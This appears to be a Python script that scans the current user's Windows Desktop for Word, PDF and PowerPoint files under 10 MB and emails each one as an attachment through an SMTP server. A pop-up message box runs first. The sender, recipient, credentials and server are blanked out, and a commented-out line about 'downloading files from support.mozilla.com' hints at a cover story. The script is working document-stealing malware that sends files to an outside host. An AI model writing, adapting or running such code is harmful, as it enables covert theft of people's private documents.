import smtplib,os, email, ctypes, sys
import email.mime.application
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


ext = [".docx", ".pdf", ".pptx", ".ppt",  \
       ".doc", \
       ]

path = os.environ["HOMEPATH"]+"\Desktop";

def progress(count, total, status=''):
    sys.stdout.flush();
    bar_len = 60;
    filled_len = int(round(bar_len * count / float(total)));
    percents = round(100.0 * count / float(total), 1);
    bar = '=' * filled_len + '-' * (bar_len - filled_len);
    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status));
    sys.stdout.flush();

def filescraper(msg):
    list = [];
    for root, dirs, files in os.walk(msg):
        path = root.split(os.sep)
        #print((len(path) - 1) * '---', os.path.basename(root))
        for file in files:
            if file.endswith(tuple(ext)):
                #print(root);
                #print(file);
                fullpath = os.path.join("C:",root,file)
                size = os.path.getsize(fullpath)
                print size;
                if size <= 10000000:
                	list.append(fullpath);
                
                #print(len(path) * '---', file)
    return list;

def mailer(list):

    total = len(list);
    i =0;
    #count = 1;
    fromaddr = '###############################'
    toaddrs  = '################################'
    #bar = progressbar.ProgressBar()
    #print("Downloading files from support.mozilla.com- ")
    for file in list:
        #count += 1;
        #percentage = (count / total) * 100
        progress(i, total, status='####################################')
        msg = MIMEMultipart()
        msg['Subject'] = file.strip("C:\\Users\\Developer\\Desktop")
        msg['From'] = '########################'
        msg['To'] = '####################'
        username = 'XXXXXXXXXXXXXXXX'
        password = "XXXXXXXXXXXXXXX"
        message = "##############################################"
        filename = file;
        fp = open(filename, 'rb')
        att = email.mime.application.MIMEApplication(fp.read())
        fp.close()
        att.add_header('Content-Disposition', 'attachment', filename=filename)
        msg.attach(att)
        part = MIMEText(message, 'plain')
        msg.attach(part)
        server = smtplib.SMTP('XXXXXXXXXXXXXXXXXXXXXXXXX:587')
        server.ehlo();
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, toaddrs,msg.as_string())
        server.quit()
        i += 1 
        #bar.update(percentage)
        #print("Sent File: " + file)

ctypes.windll.user32.MessageBoxW(0, "############################################################", 1)
doclist=filescraper(path);
mailer(doclist);

#added progressbar and chinese?? pop up box 28 Jan 2019

